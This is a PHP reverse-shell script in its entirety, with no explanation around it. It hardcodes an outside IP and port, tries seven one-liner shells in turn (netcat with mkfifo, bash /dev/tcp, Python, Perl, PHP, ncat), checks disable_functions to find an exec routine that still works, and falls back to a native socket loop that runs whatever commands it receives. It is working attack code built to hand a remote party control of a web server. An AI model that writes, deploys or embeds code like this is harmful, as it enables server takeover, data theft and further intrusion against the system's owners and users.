<?php
set_time_limit(0);
error_reporting(0);

$ip = '165.101.18.23';
$port = 443;

$methods = array(
    'nc_mkfifo' => "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f",
    'bash_tcp'  => "/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'",
    'python'    => "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$ip\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
    'python3'   => "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$ip\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
    'perl'      => "perl -e 'use Socket;\$i=\"$ip\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
    'php_sock'  => "php -r '\$s=fsockopen(\"$ip\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    'ncat'      => "ncat $ip $port -e /bin/sh",
);

// Find working exec function
function run_cmd($cmd) {
    $disabled = array_map('trim', explode(',', ini_get('disable_functions')));
    
    if (function_exists('exec') && !in_array('exec', $disabled)) {
        exec($cmd);
        return 'exec';
    } elseif (function_exists('system') && !in_array('system', $disabled)) {
        system($cmd);
        return 'system';
    } elseif (function_exists('passthru') && !in_array('passthru', $disabled)) {
        passthru($cmd);
        return 'passthru';
    } elseif (function_exists('shell_exec') && !in_array('shell_exec', $disabled)) {
        shell_exec($cmd);
        return 'shell_exec';
    } elseif (function_exists('popen') && !in_array('popen', $disabled)) {
        $h = popen($cmd, 'r');
        if ($h) { stream_get_contents($h); pclose($h); }
        return 'popen';
    } elseif (function_exists('proc_open') && !in_array('proc_open', $disabled)) {
        $d = array(0=>array('pipe','r'),1=>array('pipe','w'),2=>array('pipe','w'));
        $p = proc_open($cmd, $d, $pipes);
        if (is_resource($p)) { fclose($pipes[0]); stream_get_contents($pipes[1]); fclose($pipes[1]); fclose($pipes[2]); proc_close($p); }
        return 'proc_open';
    }
    return false;
}

// Check available tools
$disabled = array_map('trim', explode(',', ini_get('disable_functions')));

// Try each method
foreach ($methods as $name => $cmd) {
    $bg_cmd = "($cmd) >/dev/null 2>&1 &";
    $used = run_cmd($bg_cmd);
    if ($used) break;
}

// Also try PHP native socket reverse shell (no exec needed)
$sock = @fsockopen($ip, $port);
if ($sock) {
    $d = array(0 => $sock, 1 => $sock, 2 => $sock);
    if (function_exists('proc_open') && !in_array('proc_open', $disabled)) {
        $p = proc_open('/bin/sh -i', $d, $pipes);
    } else {
        while (!feof($sock)) {
            $cmd = fgets($sock);
            if ($cmd === false) break;
            $fn = run_cmd("($cmd) 2>&1");
        }
        fclose($sock);
    }
}
?>
